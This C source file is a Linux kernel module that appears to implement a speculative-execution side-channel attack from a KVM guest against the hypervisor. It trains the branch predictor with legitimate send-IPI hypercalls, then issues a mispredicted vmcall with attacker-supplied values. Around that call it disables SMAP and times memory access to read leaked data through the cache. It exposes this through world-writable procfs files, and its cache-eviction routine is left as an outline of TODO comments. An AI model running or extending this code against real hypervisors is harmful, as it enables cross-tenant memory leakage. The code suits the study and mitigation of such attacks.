// You can only do hypercalls from ring 0, so this has to be a kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/types.h>

#include <linux/kvm_para.h>

#include "cache_eviction.h"
#include "hypercall.h"
#include "linux/gfp_types.h"
#include "timing.h"

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_send_ipi;
static struct proc_dir_entry *proc_measure_cache_eviction_set;

static inline __attribute__((always_inline)) void disable_smap(void) { __asm__ volatile("stac" ::: "cc"); }
static inline __attribute__((always_inline)) void enable_smap(void) { __asm__ volatile("clac" ::: "cc"); }

static inline __attribute__((always_inline)) void confuse_branch_predictor(void) {
  // Bring the branch predictor into a known state of history
  asm volatile("movq $0, %%rcx\n"
               "cmpq $0, %%rcx\n"
               ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
               "je 1f\n"
               "1:\n"
               ".endr\n" ::
                   : "rcx", "cc");
}

static noinline void vmcall(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
                            unsigned long rsi) {
  confuse_branch_predictor();
  asm volatile("vmcall" : "+a"(hypercall_number), "+b"(rbx), "+c"(rcx), "+d"(rdx), "+S"(rsi));
}

static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct send_ipi_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  int type = KVM_HC_SEND_IPI;

  // Take the correct branch twice, so the 2-bit saturating counter from the branch predictor
  // will be at least in the weakly taken/strongly taken state
  //
  //                    taken           taken        taken
  //       ┌─►┌─────────┬────►┌─────────┬────►┌──────┬────►┌────────┬──┐
  //   not │  │strongly │     │ weakly  │     │weakly│     │strongly│  │taken
  //  taken│  │not taken│     │not taken│     │taken │     │ taken  │  │
  //       └──┴─────────┘◄────┴─────────┘◄────┴──────┘◄────┴────────┘◄─┘
  //                      not             not          not
  //                     taken           taken        taken
  //
  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);

  // Do the mispredicted vmcall!
  disable_smap();
  vmcall(type, opts.mispredicted.mask_low, opts.mispredicted.mask_high, opts.mispredicted.min,
         opts.mispredicted.icr.raw_icr);
  size_t time = access_time(opts.ptr);
  enable_smap();

  return time;
}

static noinline size_t measure_vmcall_timing(int hypercall_number, unsigned long rbx, unsigned long rcx,
                                             unsigned long rdx, unsigned long rsi) {
  confuse_branch_predictor();
  volatile unsigned long time = hypercall_number;
  asm volatile(
      // rdtsc overwrites these, but they are also needed by the vmcall
      "mov %%rdx, %%r14\n"
      "mov %%rax, %%r15\n"

      // Start the timer
      "mfence\n"
      "lfence\n"
      "rdtsc\n"
      "lfence\n"

      // Store the start timestamp in r13 and restore
      // the vmcall parameters
      "movl %%eax, %%r13d\n"
      "mov %%r14, %%rdx\n"
      "mov %%r15, %%rax\n"

      "vmcall\n"

      // Stop the timer, and calculate the difference
      "lfence\n"
      "rdtsc\n"
      "subl %%r13d, %%eax\n"
      : "=a"(time)
      : "b"(rbx), "c"(rcx), "d"(rdx), "S"(rsi)
      : "r13", "r14", "r15");
  return time;
}

static const struct proc_ops send_ipi_fops = {
    .proc_write = send_ipi_write,
};

#define L2_NR_OF_SETS (1024)
struct hc_set_indices {
  size_t size;
  size_t buf[L2_NR_OF_SETS];
};

void push_set_index(struct hc_set_indices *x, size_t idx) {
  BUG_ON(x->size > L2_NR_OF_SETS);
  x->buf[x->size] = idx;
  x->size++;
}

static ssize_t measure_cache_evict(struct file *file, const char __user *buf, size_t len, loff_t *offset) {
  struct hc_set_indices *set = kzalloc(sizeof(struct hc_set_indices), GFP_KERNEL);
  for (size_t i = 0; i < L2_NR_OF_SETS; ++i) {
    push_set_index(set, i);
  }

  for (size_t i = 0; i < set->size; ++i) {
    pr_info("final: %ld\n", set->buf[i]);
  }

  pr_info("hypercall: cache measurement done!\n");
  kfree(set);

  // Check if it is a huge page address (doing a mask on the address)
  // Do the same vmcall twice and measure the timing of the latter to establish a base line
  // Evict first set
  // Start timer
  // vmcall
  // End timer
  // Evict second set
  // ...
  // List the sets that have higher timings
  return 0;
}

static const struct proc_ops cache_evict_fops = {
    .proc_write = measure_cache_evict,
};

static int __init hypercall_main(void) {
  const char *procfs_root_name = "hypercall";
  const char *procfs_ipi_name = "send_ipi";
  const char *procfs_cache_evict_name = "measure_cache_eviction_set";

  // Initialize the root procfs entry
  proc_root = proc_mkdir(procfs_root_name, NULL);
  if (!proc_root) {
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s\n", procfs_root_name);
    return -ENOMEM;
  }

  // Initialize the send_ipi entry
  proc_send_ipi = proc_create(procfs_ipi_name, 0666, proc_root, &send_ipi_fops);
  if (!proc_send_ipi) {
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_ipi_name);
    return -ENOMEM;
  }

  // Initialize the measure_cache_eviction_set entry
  proc_measure_cache_eviction_set = proc_create(procfs_cache_evict_name, 0666, proc_root, &cache_evict_fops);
  if (!proc_measure_cache_eviction_set) {
    proc_remove(proc_measure_cache_eviction_set);
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s/%s\n", procfs_root_name,
             procfs_cache_evict_name);
    return -ENOMEM;
  }

  pr_info("hypercall: procfs entries created\n");

  return 0;
}

static void __exit hypercall_exit(void) {
  proc_remove(proc_measure_cache_eviction_set);
  proc_remove(proc_send_ipi);
  proc_remove(proc_root);
  pr_info("hypercall: procfs entries removed\n");
}

module_init(hypercall_main);
module_exit(hypercall_exit);
MODULE_LICENSE("GPL");
